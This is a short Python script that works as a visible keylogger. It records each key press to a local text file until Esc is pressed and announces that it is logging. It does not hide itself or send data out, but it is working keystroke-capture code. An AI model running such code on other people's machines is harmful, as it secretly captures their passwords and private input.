import keyboard

file: str = "keylog.txt"

def log_key_to_file(event) -> None:
    """Log key presses to a file."""
    key = str(event.name)
    with open(file, "a") as lk:  # Use "a" mode to append instead of overwrite
        lk.write(key + "\n")

def main() -> None:
    # Listen for key press events and log each key press to the file
    keyboard.on_press(log_key_to_file)
    print(f"Logging keys to {file} Press 'esc' to stop.")
    
    # Block until 'esc' is pressed
    keyboard.wait('esc')


if __name__ == "__main__":
    main()
